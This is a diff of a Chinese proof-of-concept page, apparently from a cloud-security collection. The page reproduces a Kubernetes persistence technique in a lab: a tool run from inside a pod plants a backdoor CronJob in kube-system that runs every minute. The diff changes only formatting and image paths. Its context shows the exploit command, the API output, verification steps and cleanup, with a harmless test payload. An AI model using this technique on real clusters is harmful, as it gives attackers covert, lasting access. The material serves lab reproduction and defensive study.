@@ -8,13 +8,13 @@ Cronjob 是 K8s 集群的一种资源，类似于 Linux 系统中的 cron 任务
 
 参考链接：
 
-- https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob
-- https://github.com/cdk-team/CDK/blob/main/test/k8s_exploit_util/cronjob.yaml
-- https://github.com/Metarget/metarget
+* https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob
+* https://github.com/cdk-team/CDK/blob/main/test/k8s\_exploit\_util/cronjob.yaml
+* https://github.com/Metarget/metarget
 
 ## 环境搭建
 
-基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md) 完成。
+基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](<Kubernetes + Ubuntu 18.04 漏洞环境搭建.md>) 完成。
 
 本例中各组件版本如下：
 
@@ -41,7 +41,7 @@ NAME                   READY   STATUS    RESTARTS   AGE
 k8s-backdoor-cronjob   1/1     Running   0          3m56s
 ```
 
-![](images/Kubernetes%20部署后门%20CronJob/image-20250422135426486.png)
+![](../.gitbook/assets/image-20250422135426486.png)
 
 ## 漏洞复现
 
@@ -70,7 +70,7 @@ kubectl exec -n metarget -it k8s-backdoor-cronjob -- /cdk_modified run k8s-cronj
 {"kind":"CronJob","apiVersion":"batch/v1","metadata":{"name":"cdk-backdoor-cronjob","namespace":"kube-system","uid":"45aed148-bfd3-4a2a-9593-77db015b74a4","resourceVersion":"15914","generation":1,"creationTimestamp":"2025-04-22T06:08:20Z","managedFields":[{"manager":"Go-http-client","operation":"Update","apiVersion":"batch/v1","time":"2025-04-22T06:08:20Z","fieldsType":"FieldsV1","fieldsV1":{"f:spec":{"f:concurrencyPolicy":{},"f:failedJobsHistoryLimit":{},"f:jobTemplate":{"f:spec":{"f:template":{"f:spec":{"f:containers":{"k:{\"name\":\"cdk-backdoor-cronjob-container\"}":{".":{},"f:args":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:dnsPolicy":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{}}}}},"f:schedule":{},"f:successfulJobsHistoryLimit":{},"f:suspend":{}}}}]},"spec":{"schedule":"* * * * *","concurrencyPolicy":"Allow","suspend":false,"jobTemplate":{"metadata":{"creationTimestamp":null},"spec":{"template":{"metadata":{"creationTimestamp":null},"spec":{"containers":[{"name":"cdk-backdoor-cronjob-container","image":"ubuntu","args":["/bin/sh","-c","touch /tmp/awesome_poc ; sleep 10000"],"resources":{},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"OnFailure","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","securityContext":{},"schedulerName":"default-scheduler"}}}},"successfulJobsHistoryLimit":3,"failedJobsHistoryLimit":1},"status":{}}
 ```
 
-![](images/Kubernetes%20部署后门%20CronJob/image-20250422141541628.png)
+![](../.gitbook/assets/image-20250422141541628.png)
 
 验证部署结果：
 
@@ -81,7 +81,7 @@ NAME                   SCHEDULE    TIMEZONE   SUSPEND   ACTIVE   LAST SCHEDULE  
 cdk-backdoor-cronjob   * * * * *   <none>     False     2        7s              107s
 ```
 
-![](images/Kubernetes%20部署后门%20CronJob/image-20250422141257013.png)
+![](../.gitbook/assets/image-20250422141257013.png)
 
 查看通过 cronjobs 在 `kubs-system` 命名空间下的 pod：
 
@@ -95,7 +95,7 @@ cdk-backdoor-cronjob-29088371-gzggb   1/1     Running   0              9m22s
 ...
 ```
 
-![](images/Kubernetes%20部署后门%20CronJob/image-20250422142314469.png)
+![](../.gitbook/assets/image-20250422142314469.png)
 
 ## 环境复原
 
@@ -107,7 +107,7 @@ kubectl delete -f k8s_metarget_namespace.yaml
 
 ## YAML
 
-[k8s_metarget_namespace.yaml](https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml)
+[k8s\_metarget\_namespace.yaml](https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml)
 
 ```
 apiVersion: v1
@@ -116,7 +116,7 @@ metadata:
   name: metarget
 ```
 
-[k8s_backdoor_cronjob.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_backdoor_cronjob.yaml)
+[k8s\_backdoor\_cronjob.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_backdoor_cronjob.yaml)
 
 ```
 apiVersion: v1
